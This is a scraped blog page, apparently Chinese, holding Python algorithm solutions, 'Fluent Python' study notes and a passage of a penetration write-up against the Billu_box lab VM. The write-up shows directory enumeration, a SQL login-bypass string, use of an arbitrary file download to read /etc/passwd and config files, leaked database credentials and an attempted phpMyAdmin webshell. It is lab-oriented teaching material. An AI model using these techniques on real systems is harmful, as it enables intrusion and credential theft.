+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">addTwoNumbers</span><span class="params">(self, l1, l2)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type l1: ListNode</span></span><br><span class="line"><span class="string">        :type l2: ListNode</span></span><br><span class="line"><span class="string">        :rtype: ListNode</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> l1 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> l2</span><br><span class="line">        <span class="keyword">if</span> l2 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> l1</span><br><span class="line"> </span><br><span class="line">        tmp = ListNode(<span class="number">0</span>)</span><br><span class="line">        res = tmp</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> l1 <span class="keyword">or</span> l2:</span><br><span class="line">            tmpsum = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> l1:</span><br><span class="line">                tmpsum = l1.val</span><br><span class="line">                l1 = l1.next</span><br><span class="line">            <span class="keyword">if</span> l2:</span><br><span class="line">                tmpsum += l2.val</span><br><span class="line">                l2 = l2.next</span><br><span class="line">            tmpres = ((tmpsum + flag) % <span class="number">10</span>)</span><br><span class="line">            flag = ((tmpsum + flag) // <span class="number">10</span>)</span><br><span class="line">            res.next = ListNode(tmpres)</span><br><span class="line">            res = res.next</span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">            res.next = ListNode(<span class="number">1</span>)</span><br><span class="line">        res = tmp.next</span><br><span class="line">        <span class="keyword">del</span> tmp</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>
+<h2 id="10-爬楼梯问题"><a href="#10-爬楼梯问题" class="headerlink" title="10.爬楼梯问题"></a>10.爬楼梯问题</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def fun(n):</span><br><span class="line">    if n==0:</span><br><span class="line">        return ‘error’</span><br><span class="line">    elif n==1:</span><br><span class="line">        return 1</span><br><span class="line">    elif n==2:</span><br><span class="line">        return 2</span><br><span class="line">    else:</span><br><span class="line">        return fun(n-2)+fun(n-1)</span><br><span class="line">print(fun(3))</span><br><span class="line"></span><br><span class="line"># 一次1和2和3个台阶</span><br><span class="line">#到n层有三种情况，n-3，n-2，n-1</span><br><span class="line">#分别的情况种类为fun1(n-3)，fun1(n-2)，fun1(n-1)</span><br><span class="line">def fun1(n):</span><br><span class="line">    if n==0:</span><br><span class="line">        return &apos;error&apos;</span><br><span class="line">    elif n == 1:</span><br><span class="line">        return 1</span><br><span class="line">    elif n==2:</span><br><span class="line">        return 2</span><br><span class="line">    elif n==3:</span><br><span class="line">        return 4</span><br><span class="line">    else:</span><br><span class="line">        return fun1(n-3)+fun1(n-2)+fun1(n-1)</span><br><span class="line">print(fun1(3))</span><br></pre></td></tr></table></figure>
+<h2 id="11-求众数"><a href="#11-求众数" class="headerlink" title="11.求众数"></a>11.求众数</h2><p>给定一个大小为 <em>n</em> 的数组，找到其中的众数。众数是指在数组中出现次数<strong>大于</strong> <code>⌊ n/2 ⌋</code> 的元素。</p>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/07/15/liu-chang-de-python-xue-xi-bi-ji/">流畅的Python学习笔记</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-07-15</time><div class="content"><h1 id="流畅的python学习笔记"><a href="#流畅的python学习笔记" class="headerlink" title="流畅的python学习笔记"></a>流畅的python学习笔记</h1><hr>
+<h1 id="第一章节-python特殊方法"><a href="#第一章节-python特殊方法" class="headerlink" title="第一章节 python特殊方法"></a>第一章节 python特殊方法</h1><ol>
+<li><p>python里面的特殊方法(魔术方法)  <code>__getitem__</code>,<code>len（）</code></p>
+</li>
+<li><p>collections.namedtuple构建一个简单的类，这个类只有少量的属性没有方法</p>
+<p><code>def namedtuple(typename, field_names, verbose=False, rename=False)</code></p>
+<p><strong>typename:</strong>类名称</p>
+<p><strong>field_names：</strong>字段名称，保证元素间顺序不变的可遍历对象或者是逗号链接起来的字符串</p>
+<p><strong>verbose</strong>：设置为true的话会打印出类的定义代码</p>
+</li>
+<li><p>for i in x: 实际上调用的是iter(x)，<code>x.__iter__()</code>方法</p>
+</li>
+<li><p><code>__repr_</code>将对象用字符串的形式表达出来，交互式控制台和调试程序用repr函数来获取字符串表示</p>
+</li>
+<li><p><code>__repr__</code>和<code>__str__</code>的区别:str函数或者print打印一个对象的时候调用，如果没用实现str函数，python会使用repr调用，repr式用来记录日志，后者式用来给终端用户看的</p>
+</li>
+<li><p>if (一个对象)或者while(一个对象)会调用这个对象的bool魔术方法，如果这个魔术方法没用定义它会len方法，返回0就是false,否则就会返回true</p>
+</li>
+<li><p>len的方法在内置类中调用特别块，因为它使用了cpython直接从C结构体中读取对象的长度，完全不会调用任何方法，</p>
+</li>
+</ol>
+<h1 id="第二章节-序列"><a href="#第二章节-序列" class="headerlink" title="第二章节  序列"></a>第二章节  序列</h1><h1 id="2-1-列表的分类"><a href="#2-1-列表的分类" class="headerlink" title="2.1 列表的分类"></a>2.1 列表的分类</h1><p>序列分为两种：</p>
+<p>容器序列：list、tuple、collections.deque可以存放不同类型的数据，存放的是对象的引用</p>
+<p>扁平序列:</p>
+<p>str、bytes、bytearray、memoryview和array.array都只能容纳一种类型，存放的不是引用，是值。</p>
+<p>可变的序列: list、bytearray、array.array、collections.deque和memoryview</p>
+<p>不可变的：tuple、str和bytes。</p>
+<h2 id="2-2-列表的推导和可读性（生成列表）"><a href="#2-2-列表的推导和可读性（生成列表）" class="headerlink" title="2.2 列表的推导和可读性（生成列表）"></a>2.2 列表的推导和可读性（生成列表）</h2><h2 id="2-3-生成器表达式"><a href="#2-3-生成器表达式" class="headerlink" title="2.3 生成器表达式"></a>2.3 生成器表达式</h2><p>生成器表达式可以逐个的产出元素，而不是建立一个完整的列表，方括号换成圆括号。</p>
+<h2 id="2-4-元组"><a href="#2-4-元组" class="headerlink" title="2.4 元组"></a>2.4 元组</h2><p>不可变的列表+<strong>记录</strong></p>
+<p>b,a=a,b交换变量</p>
+<p>divmod（20，8）=（2，4）</p>
+<p>元组的拆包</p>
+<p>具名元组：collections.namedtuple的使用</p>
+<h2 id="2-5-切片"><a href="#2-5-切片" class="headerlink" title="2.5 切片"></a>2.5 切片</h2><h3 id="2-5-1-为什么切片最后一个值不取？"><a href="#2-5-1-为什么切片最后一个值不取？" class="headerlink" title="2.5.1 为什么切片最后一个值不取？"></a>2.5.1 为什么切片最后一个值不取？</h3><p>元组列表和字符串都支持切片操作。python的切片和区间操作不包含区间范围的最后一个元素是python的风格，</p>
+<p>切片忽略最后一个元素的好处：</p>
+<ul>
+<li>当只有末尾的数字的index的时候可以快速看出切片和区间里含有几个元素</li>
+<li>当起止位置信息都可见的时候，可以快速计算出切片和区间的长度，</li>
+<li>快速将序列分割成不重叠的两部分，my_list[:x]和my_list[x:]可以</li>
+</ul>
+<h3 id="2-5-2-切片的间隔取值"><a href="#2-5-2-切片的间隔取值" class="headerlink" title="2.5.2 切片的间隔取值"></a>2.5.2 切片的间隔取值</h3><p>s[a,b,c]<code>其中c为负值就是反向取值</code>seq.<strong>getitem</strong>(slice(start,stop,step))`</p>
+<p>slice对象</p>
+<h3 id="2-5-3-多维切片和省略"><a href="#2-5-3-多维切片和省略" class="headerlink" title="2.5.3 多维切片和省略"></a>2.5.3 多维切片和省略</h3><h3 id="2-5-4-序列使用-和"><a href="#2-5-4-序列使用-和" class="headerlink" title="2.5.4 序列使用+和*"></a>2.5.4 序列使用+和*</h3><p>不会修改原来的操作对象，构建一个全新的序列。</p>
+<h3 id="2-5-5-序列的增量赋值"><a href="#2-5-5-序列的增量赋值" class="headerlink" title="2.5.5 序列的增量赋值"></a>2.5.5 序列的增量赋值</h3><p>+=<code>使用的特殊方法是&#39;__iadd__</code>，如果没实现就会调用<code>__add__</code></p>
+<p>不可变使用就会重新创建。可变数组会改变数组的值</p>
+<p><strong>These Python Tutor</strong> ，很好可视化代码的工具</p>
+<p>dis.dis查看字节码，可以看到代码背后的运行机制。</p>
+<h3 id="2-5-6-list-sort和sorted的区别"><a href="#2-5-6-list-sort和sorted的区别" class="headerlink" title="2.5.6 list.sort和sorted的区别"></a>2.5.6 list.sort和sorted的区别</h3><p>sort不会返回值，它直接会就地进行一个排序，函数存在两个参数 key和reverse</p>
+<h3 id="2-5-7-bisect和insort进行已排序的序列的管理"><a href="#2-5-7-bisect和insort进行已排序的序列的管理" class="headerlink" title="2.5.7  bisect和insort进行已排序的序列的管理"></a>2.5.7  bisect和insort进行已排序的序列的管理</h3><h3 id="2-5-9-deque"><a href="#2-5-9-deque" class="headerlink" title="2.5.9 deque"></a>2.5.9 deque</h3><h1 id="第三章-字典和集合"><a href="#第三章-字典和集合" class="headerlink" title="第三章 字典和集合"></a>第三章 字典和集合</h1><p>isinstance(my_dict,abc.Mapping),可散列需要有两个方法:<code>__hash_`</code>和<strong>qe</strong>`,</p>
+<p>字典推导</p>
+<h2 id="1-常见的映射方法"><a href="#1-常见的映射方法" class="headerlink" title="1.常见的映射方法"></a>1.常见的映射方法</h2><p>dict、collections.defaultdict、defaultdict.orderedDict</p>
+<h2 id="2-使用setdefault处理找不到的键"><a href="#2-使用setdefault处理找不到的键" class="headerlink" title="2.使用setdefault处理找不到的键"></a>2.使用setdefault处理找不到的键</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dict.setdefault(key, default=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure>
+<p>setdefault 同时也会改变 dict 的值</p>
+<h2 id="3-映射的弹性键查询"><a href="#3-映射的弹性键查询" class="headerlink" title="3.映射的弹性键查询"></a>3.映射的弹性键查询</h2><h2 id="4-字典的变种"><a href="#4-字典的变种" class="headerlink" title="4.字典的变种"></a>4.字典的变种</h2><p>collections.OrdereDict</p>
+<p>子类化UserDict</p>
+<h2 id="5-集合"><a href="#5-集合" class="headerlink" title="5.集合"></a>5.集合</h2><p>集合推导</p>
+<h2 id="6-字典中的散列表"><a href="#6-字典中的散列表" class="headerlink" title="6.字典中的散列表"></a>6.字典中的散列表</h2><p> 散列表是一个稀疏数组，大概三分之一的空间是空的</p>
+<p>内置的hash用于所有的内置类型的对象，且如果两个对象在比较的时候是相等的，那它们的散列值必须是相等的，否则散列表就不能正常的运行。如1==1.0返回true，那么hash(1)==hash(1.0)必须为真。</p>
+<p>散列表算法：</p>
+<p>获取my_dict[search_key]背后值，python首先会调用hash(search_key)来计算search_key的散列值，</p>
+<p><img src="/.com//Typora/流畅的Python学习笔记/1563271134377.png" alt="1563271134377"></p>
+<h2 id="7-字典的实现及其导致的结果"><a href="#7-字典的实现及其导致的结果" class="headerlink" title="7.字典的实现及其导致的结果"></a>7.字典的实现及其导致的结果</h2><p>键必须是可散列的，可散列指的是:</p>
+<ol>
+<li>支持hash()函数，通过 <code>__hash_()</code>方法所得到的散列值是不变的</li>
+<li>支持<code>__eq__（）</code>方法检测相等性</li>
+<li>若a==b为真，则hash(a)==hash(b)也为真。</li>
+</ol>
+<p>字典的劣势:</p>
+<p>字典在内存上的开销比较大，可以用具名元祖来代替字典。<code>__slots_</code>可以改变实例属性的存储方式，由dict变成tuple.</p>
+<p>键的次序取决于添加顺序</p>
+<p>字典添加新建可能改变已有键的顺序</p>
+<h2 id="8-集合的实现以及导致的结果"><a href="#8-集合的实现以及导致的结果" class="headerlink" title="8.集合的实现以及导致的结果"></a>8.集合的实现以及导致的结果</h2><p>散列表存放的是元素的引用。</p>
+<p>集合里面的元素必须是可散列的，集合很消耗内存，可以很高效的判断元素是否是存在于集合</p>
+<p>元素的次序取决于被添加到集合里的次序</p>
+<p>往集合里面添加元素，可能会改变集合里已有元素的次序</p>
+<h1 id="第四章-文本和字节序列"><a href="#第四章-文本和字节序列" class="headerlink" title="第四章 文本和字节序列"></a>第四章 文本和字节序列</h1><h2 id="1-字符问题"><a href="#1-字符问题" class="headerlink" title="1.字符问题"></a>1.字符问题</h2><p><strong>编码</strong>: 字符串的unicode 码位变成用于存储以及传输的字节形式</p>
+<p><strong>解码</strong>：就是将字节转化位人类可以看到的字符串。</p>
+<h2 id="2-字节概要"><a href="#2-字节概要" class="headerlink" title="2.字节概要"></a>2.字节概要</h2><p>bytes和bytearray的切片仍然是一个切片，元素是一个十进制的数，str[0]==str[:1]，但是bytes[:1]!=bytes[0].</p>
+<h2 id="3-编程中的编码问题"><a href="#3-编程中的编码问题" class="headerlink" title="3.编程中的编码问题"></a>3.编程中的编码问题</h2><h3 id="3-1-编码为字节的问题"><a href="#3-1-编码为字节的问题" class="headerlink" title="3.1 编码为字节的问题"></a>3.1 编码为字节的问题</h3><p>encode中使用errors参数，指定位ignore将忽略这个不能编码的错误</p>
+<p>使用replace将会用?来代替不能编码的字符</p>
+<p>使用xmlcharrefreplace将会用xml实体来代替不可编码的字符</p>
+<h3 id="3-2-解码中的问题"><a href="#3-2-解码中的问题" class="headerlink" title="3.2 解码中的问题"></a>3.2 解码中的问题</h3><p><code>octets.decode(&#39;utf_8&#39;, errors=&#39;replace&#39;)</code> </p>
+<h3 id="3-3-使用预期之外的编码加载模块时抛出的syntaxerror"><a href="#3-3-使用预期之外的编码加载模块时抛出的syntaxerror" class="headerlink" title="3.3 使用预期之外的编码加载模块时抛出的syntaxerror"></a>3.3 使用预期之外的编码加载模块时抛出的syntaxerror</h3><p><code># coding: cp1252</code></p>
+<h3 id="3-4如何找出字节序列的编码"><a href="#3-4如何找出字节序列的编码" class="headerlink" title="3.4如何找出字节序列的编码"></a>3.4如何找出字节序列的编码</h3><p>假如有个文本文件，里面保存的是源码或诗句，但是你不知道它的编码。如何查明真正的编码呢？</p>
+<p>统一字符编码侦测包Chardet（<a href="https://pypi.python.org/pypi/chardet）就是这样工作的，它能识别所支持的30" target="_blank" rel="noopener">https://pypi.python.org/pypi/chardet）就是这样工作的，它能识别所支持的30</a> 种编码。Chardet 是一个Python 库，<br>可以在程序中使用，不过它也提供了命令行工具chardetect。下面是它对本章书稿文件的检测报告：</p>
+<h3 id="3-5-python处理文本文件"><a href="#3-5-python处理文本文件" class="headerlink" title="3.5 python处理文本文件"></a>3.5 python处理文本文件</h3><p>python中的默认文本编码：</p>
+<ol>
+<li>文本文件默认使用locale.getpreferredencoding()，如果打开文件时没有指定encoding 参数，默认值由<br>locale.getpreferredencoding() 提供。</li>
+<li>如果设定了PYTHONIOENCODING 环境变量（<a href="https://docs.python.org/3/using/cmdline.html#envvarPYTHONIOENCODING），sys.stdout/stdin/stderr" target="_blank" rel="noopener">https://docs.python.org/3/using/cmdline.html#envvarPYTHONIOENCODING），sys.stdout/stdin/stderr</a> 的编码使用设定的值；否则，继承自所在的控制台；如果输入/ 输出重定向到文件，则由locale.getpreferredencoding() 定义</li>
+<li>Python 在二进制数据和字符串之间转换时，内部使用sys.getdefaultencoding() 获得的编码；</li>
+<li>sys.getfilesystemencoding() 用于编解码文件名</li>
+<li>locale.getpreferredencoding() 返回的编码是最重要的：这是打开文件的默认编码，也是重定向到文件的sys.stdout/stdin/stderr 的默认编码</li>
+</ol>
+<h2 id="第五章-一等对象函数"><a href="#第五章-一等对象函数" class="headerlink" title="第五章 一等对象函数"></a>第五章 一等对象函数</h2><p>在python中，函数是一等对象。一等对象具有以下的特性：</p>
+<ul>
+<li>在运行时创建</li>
+<li>能赋值给变量或数据结构中的元素</li>
+<li>能作为参数传给函数</li>
+<li>能作为函数的返回结果</li>
+</ul>
+<h3 id="1-高阶函数"><a href="#1-高阶函数" class="headerlink" title="1 高阶函数"></a>1 高阶函数</h3><ol>
+<li><strong>定义：</strong>接受函数为参数，或者把函数作为结果返回的函数是高阶函数</li>
+</ol>
+<p>python3中的高阶函数:最为人熟知的高阶函数有<strong>map</strong>、<strong>filter</strong>、<strong>reduce</strong>.</p>
+<p><strong>map</strong>和<strong>filter</strong>可以使用列表推导式或者使用生成器表达式代替，避免了匿名函数，<strong>reduce</strong>是用来求和的函数，使用<strong>sum</strong>代替了</p>
+<p>all(iterable):如果iterable 的每个元素都是真值，返回True；all([]) 返回True.</p>
+<p>any(iterable): 只要iterable 中有元素是真值，就返回True；any([]) 返回False。</p>
+<h3 id="2-匿名函数"><a href="#2-匿名函数" class="headerlink" title="2.匿名函数"></a>2.匿名函数</h3><p>lambda 函数的定义体中不能赋值，也不能使用while和try 等Python 语句</p>
+<h3 id="3-可调用对象"><a href="#3-可调用对象" class="headerlink" title="3.可调用对象"></a>3.可调用对象</h3><ul>
+<li>用户定义的函数</li>
+<li>内置函数</li>
+<li>在类的定义体中定义的函数</li>
+<li>调用类时会运行类的<code>__new__</code> 方法创建一个实例，然后运行<br><code>__init__</code> 方法，初始化实例，最后把实例返回给调用方</li>
+<li>类的实例：类定义了<strong>call</strong> 方法，那么它的实例可以作为函数调用。</li>
+<li>生成器函数。使用yield 关键字的函数或方法。调用生成器函数返回的是生成器对象。</li>
+</ul>
+<p>判断一个对象是否是可调用使用:Python 中有各种各样可调用的类型，因此判断对象能否调用，最安<br>全的方法是使用内置的<strong>callable()</strong> 函数</p>
+<h3 id="4-用户自定义的可调用类型"><a href="#4-用户自定义的可调用类型" class="headerlink" title="4.用户自定义的可调用类型"></a>4.用户自定义的可调用类型</h3><p>实现类的<strong>call</strong>的特殊方法，就能将类实现函数式调用。</p>
+<h3 id="5-函数内省"><a href="#5-函数内省" class="headerlink" title="5.函数内省"></a>5.函数内省</h3><p>把函数视作对象特有的特性。dir 函数可以探知函数具有下述属性：</p>
+<p>函数对象的特殊方法：</p>
+<ul>
+<li><code>__dict__</code></li>
+</ul>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/07/14/billu-box-ba-ji-shen-tou/">Billu_box靶机渗透</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-07-14</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/渗透测试/">渗透测试</a></span><div class="content"><h1 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h1><p>靶机环境为<strong>Ubuntu(32)+php+mysql+apachem,</strong>攻击机为<strong>kali linux.</strong>  目标主机ip（192.168.188.140），kali ip(192.168.188.139)</p>
+<hr>
+<h2 id="1-扫描存活主机"><a href="#1-扫描存活主机" class="headerlink" title="1.扫描存活主机"></a>1.扫描存活主机</h2><p>使用arp-scan扫描本地存活主机</p>
+<p> <img src="/.com//1563073977625.png" alt="1563073977625"></p>
+<hr>
+<h2 id="2-使用SPARTA工具进行端口、服务以及Nikto扫描"><a href="#2-使用SPARTA工具进行端口、服务以及Nikto扫描" class="headerlink" title="2.使用SPARTA工具进行端口、服务以及Nikto扫描"></a>2.使用SPARTA工具进行端口、服务以及Nikto扫描</h2><p><img src="/.com//1563074239538.png" alt="1563074239538"></p>
+<p>发现目标主机只存在两个端口开放，nikto进行的漏洞扫描结果</p>
+<p><img src="/.com//1563074407277.png" alt="1563074407277"></p>
+<p>根据扫描结果发现有一个phpinfo的信息泄露。打开<strong>192.168.188.140/in.php</strong>,收集一些敏感信息。</p>
+<ul>
+<li>php版本为5.3.10》5.3.4，这个版本不能使用00截断进行文件包含</li>
+<li>网站的根目录是<strong>/var/www</strong>,如果存在sql注入且是root权限可以直接将shell写入网站目录中。</li>
+<li>mysql的版本是5.5.38</li>
+<li>session的存储路径是<strong>/var/lib/php5</strong></li>
+</ul>
+<hr>
+<h2 id="3-使用dirbuster进行目录枚举"><a href="#3-使用dirbuster进行目录枚举" class="headerlink" title="3.使用dirbuster进行目录枚举"></a>3.使用dirbuster进行目录枚举</h2><p><img src="/.com//1563075621237.png" alt="1563075621237"></p>
+<p>根据dirbuster的目录爆破，可以发现in.php,add.php,show.php,panel.php、test.php等。</p>
+<h2 id="4-使用dirb进行目录枚举"><a href="#4-使用dirb进行目录枚举" class="headerlink" title="4.使用dirb进行目录枚举"></a>4.使用dirb进行目录枚举</h2><p><code>dirb http://192.168.188.140 /usr/share/dirb/wordlists/big.txt -o 192.168.188.140.txt</code></p>
+<hr>
+<h1 id="0x02-漏洞挖掘"><a href="#0x02-漏洞挖掘" class="headerlink" title="0x02 漏洞挖掘"></a>0x02 漏洞挖掘</h1><h2 id="1-sql注入"><a href="#1-sql注入" class="headerlink" title="1.sql注入"></a>1.sql注入</h2><p>访问首页，发现登录框，使用万能密码注入：用户名输入:<code>admin&#39;or &#39;1&#39;=&#39;1#</code>,密码随意输入字符串，注入无效，try again,使用burpsuit抓包，发送到sqlmap跑post注入无果，加载所有的temper没用，此处不知道网站是如何过滤的，暂时放弃注入</p>
+<h2 id="2-任意文件下载"><a href="#2-任意文件下载" class="headerlink" title="2.任意文件下载"></a>2.任意文件下载</h2><p>访问192.168.188.140/test.php，网页提示需要file的参数，尝试url添加<strong>file=in.php</strong>，依然提示需要file参数，尝试使用post提交，hackbar</p>
+<p><img src="/.com//1563076372312.png" alt="1563076372312"></p>
+<p>提交发现可以下载in.php，此处存在任意文件下载漏洞。接下来，将网站我们可以探测到的php文件下载到本地，同时也可以在linux下的一些敏感文件 <strong>/etc/passwd</strong>,<strong>/etc/shodow</strong>,</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">syslog:x:101:103::/home/syslog:/bin/<span class="literal">false</span></span><br><span class="line">mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">messagebus:x:103:106::/var/run/dbus:/bin/<span class="literal">false</span></span><br><span class="line">whoopsie:x:104:107::/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">landscape:x:105:110::/var/lib/landscape:/bin/<span class="literal">false</span></span><br><span class="line">sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">ica:x:1000:1000:ica,,,:/home/ica:/bin/bash</span><br></pre></td></tr></table></figure>
+<p>上面可知通过ica账户和root就可以使用ssh登录</p>
+<h2 id="3-代码审计"><a href="#3-代码审计" class="headerlink" title="3.代码审计"></a>3.代码审计</h2><h3 id="1-尝试绕过sql注入"><a href="#1-尝试绕过sql注入" class="headerlink" title="1.尝试绕过sql注入"></a>1.尝试绕过sql注入</h3><p>下载首页，include了一个c.php，下载c.php，发现是数据库连接文件，找到数据库的连接用户名和密码：billu，b0x_billu</p>
+<p><code>$conn = mysqli_connect(&quot;127.0.0.1&quot;,&quot;billu&quot;,&quot;b0x_billu&quot;,&quot;ica_lab&quot;);</code></p>
+<p>尝试使用这个密码登录首页，有时候数据库的连接密码和管理员使用的账号密码一致，尝试登录失败。    </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">   $uname=str_replace(<span class="string">'\''</span>,<span class="string">''</span>,urldecode($_POST[<span class="string">'un'</span>]));</span><br><span class="line">$pass=str_replace(<span class="string">'\''</span>,<span class="string">''</span>,urldecode($_POST[<span class="string">'ps'</span>]));</span><br><span class="line">$run=<span class="string">'select * from auth where  pass=\''</span>.$pass.<span class="string">'\' and uname=\''</span>.$uname.<span class="string">'\''</span>;</span><br><span class="line">$result = mysqli_query($conn, $run);</span><br></pre></td></tr></table></figure>
+<p>无法闭合单引号，个人觉得sql注入无法使用，除非开启gpc。再审计panel.php。</p>
+<h3 id="2-枚举出phpmyadmin文件读取配置文件"><a href="#2-枚举出phpmyadmin文件读取配置文件" class="headerlink" title="2.枚举出phpmyadmin文件读取配置文件"></a>2.枚举出phpmyadmin文件读取配置文件</h3><p>此时查看扫描的目录还有什么信息可以被利用，可以看到dirb爆破出了phpmyadmin的目录，</p>
+<p><img src="/.com//1563086043272.png" alt="1563086043272"></p>
+<p>接下来我们使用任意文件下载漏洞读取phpmyadmin的默认配置文件config.inc.php。下载后可以发现root的账号和密码</p>
+<p><img src="/.com//1563086737885.png" alt="1563086737885"></p>
+<p>使用xshell进行连接，发现已经是root用户！</p>
+<h3 id="3-登录phpmyadmin后台getshell"><a href="#3-登录phpmyadmin后台getshell" class="headerlink" title="3.登录phpmyadmin后台getshell"></a>3.登录phpmyadmin后台getshell</h3><p>使用root:roottoor登录，失败，使用billu，b0x_billu登录成功，查看是否拥有写入文件权限:</p>
+<p><code>SHOW  GLOBAL  VARIABLES  LIKE  &#39;%secure%&#39;</code>,当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</p>
+<p>发现可以写入任意位置，根据phpinfo的信息得到路径，然后插入一句话</p>
+<p><img src="/.com//1563087305732.png" alt="1563087305732"></p>
+<p>失败，权限不够没办法getshell.</p>
+<h3 id="4-读取登录账号密码找上传"><a href="#4-读取登录账号密码找上传" class="headerlink" title="4.读取登录账号密码找上传"></a>4.读取登录账号密码找上传</h3><p>查看auth表得到登录用户名和密码为：</p>
+<p>biLLu和hEx_it，尝试登录首页。接下来就是正常渗透思路，找上传点，上传shell，找到</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(in_array($r,$image))</span><br><span class="line">	&#123;</span><br><span class="line">		$finfo = @<span class="keyword">new</span> finfo(FILEINFO_MIME); </span><br><span class="line">	$filetype = @$finfo-&gt;file($_FILES[<span class="string">'image'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">'/image\/jpeg/'</span>,$filetype )  || preg_match(<span class="string">'/image\/png/'</span>,$filetype ) || preg_match(<span class="string">'/image\/gif/'</span>,$filetype ))</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'image'</span>][<span class="string">'tmp_name'</span>], <span class="string">'uploaded_images/'</span>.$_FILES[<span class="string">'image'</span>][<span class="string">'name'</span>]))</span><br><span class="line">							 &#123;</span><br><span class="line">							  <span class="keyword">echo</span> <span class="string">"Uploaded successfully "</span>;</span><br><span class="line">							  $update=<span class="string">'insert into users(name,address,image,id) values(\''</span>.$name.<span class="string">'\',\''</span>.$address.<span class="string">'\',\''</span>.$iname.<span class="string">'\', \''</span>.$id.<span class="string">'\')'</span>; </span><br><span class="line">							 mysqli_query($conn, $update);</span><br><span class="line">							  </span><br><span class="line">							&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;br&gt;i told you dear, only png,jpg and gif file are allowed"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>存在上传点但是是白名单验证，而且没法进行截断上传版本不行，所以这个只能上传白名单的jpg等图片后缀的文件，这边思路就断了。</p>
+<h3 id="5-使用文件包含漏洞包含图片马getshell"><a href="#5-使用文件包含漏洞包含图片马getshell" class="headerlink" title="5.使用文件包含漏洞包含图片马getshell"></a>5.使用文件包含漏洞包含图片马getshell</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'continue'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	$dir=getcwd();</span><br><span class="line">	$choice=str_replace(<span class="string">'./'</span>,<span class="string">''</span>,$_POST[<span class="string">'load'</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>($choice===<span class="string">'add'</span>)</span><br><span class="line">	&#123;</span><br><span class="line">       		<span class="keyword">include</span>($dir.<span class="string">'/'</span>.$choice.<span class="string">'.php'</span>);</span><br><span class="line">			<span class="keyword">die</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">        <span class="keyword">if</span>($choice===<span class="string">'show'</span>)</span><br><span class="line">	&#123;</span><br><span class="line">        </span><br><span class="line">		<span class="keyword">include</span>($dir.<span class="string">'/'</span>.$choice.<span class="string">'.php'</span>);</span><br><span class="line">		<span class="keyword">die</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">include</span>($dir.<span class="string">'/'</span>.$_POST[<span class="string">'load'</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	